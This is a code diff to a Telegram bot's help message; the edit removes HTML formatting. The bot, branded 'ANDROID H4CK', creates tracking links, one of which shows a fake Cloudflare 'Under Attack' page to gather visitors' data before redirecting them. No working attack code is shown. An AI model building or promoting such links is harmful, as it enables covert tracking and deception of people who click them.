@@ -102,13 +102,13 @@ else if(msg.text=="/create"){
 createNew(chatId);
 }
 else if(msg.text=="/help"){
-bot.sendMessage(chatId,`<b>🛰 ANDROID H4CK — SHINITA Cosmic Warrior</b>
-<i>Advanced Link Intelligence & Analysis Bot</i>
+bot.sendMessage(chatId,`🛰 ANDROID H4CK — SHINITA Cosmic Warrior
+Advanced Link Intelligence & Analysis Bot
 
 ━━━━━━━━━━━━━━━━━━
-🔗 <b>What this bot does</b>
+🔗 What this bot does
 ━━━━━━━━━━━━━━━━━━
-Through this bot, you can generate <b>smart tracking links</b> to analyze how users interact with shared URLs.
+Through this bot, you can generate smart tracking links to analyze how users interact with shared URLs.
 
 It is commonly used for:
 • Security awareness testing  
@@ -117,45 +117,45 @@ It is commonly used for:
 • Link behavior analysis  
 
 ━━━━━━━━━━━━━━━━━━
-🚀 <b>How to Get Started</b>
+🚀 How to Get Started
 ━━━━━━━━━━━━━━━━━━
-1️⃣ Send <code>/create</code>  
+1️⃣ click /create
 2️⃣ You will be asked to provide a destination URL  
-3️⃣ The bot will generate <b>two analysis links</b> for you  
+3️⃣ The bot will generate two analysis links for you  
 
 ━━━━━━━━━━━━━━━━━━
-⚙️ <b>Link Types Explained</b>
+⚙️ Link Types Explained
 ━━━━━━━━━━━━━━━━━━
 
-<b>1️⃣ Cloudflare Intelligence Link</b>  
+1️⃣ Cloudflare Intelligence Link
 • Displays a Cloudflare “Under Attack” verification page  
 • Collects general technical visit data  
 • Automatically redirects to your destination URL  
 
-<b>2️⃣ WebView Analysis Link</b>  
+2️⃣ WebView Analysis Link
 • Loads the destination website inside an iframe  
 • Useful for compatible sites (news, blogs, landing pages)  
 
-⚠️ <i>Note:</i> Some websites block iframe usage using
-<code>X-Frame-Options</code> (e.g. Google, some banking sites).
+⚠️ Note: Some websites block iframe usage using
+X-Frame-Options (e.g. Google, some banking sites).
 
 ━━━━━━━━━━━━━━━━━━
-📺 <b>Video Tutorial</b>
+📺 Video Tutorial
 ━━━━━━━━━━━━━━━━━━
 Watch the full setup guide on YouTube:  
 👉 <a href="https://youtube.com/shorts/nepY9iD16wQ?si=fyI77zXk_rEyyQHm">Click here to watch</a>
 
 ━━━━━━━━━━━━━━━━━━
-🛡 <b>Usage Notice</b>
+🛡 Usage Notice
 ━━━━━━━━━━━━━━━━━━
-This tool is intended for <b>educational, analytical, and security-testing purposes only</b>.  
+This tool is intended for educational, analytical, and security-testing purposes only.  
 You are responsible for complying with local laws and platform policies.
 
 ━━━━━━━━━━━━━━━━━━
-📌 Type <code>/help</code> to view all available commands.
+📌 Type /help to view all available commands.
 ━━━━━━━━━━━━━━━━━━
 
-🌌 <i>ANDROID H4CK — Precision. Power. Intelligence.</i> 🌌
+🌌ANDROID H4CK — Precision. Power. Intelligence.🌌
 `);
 }
   
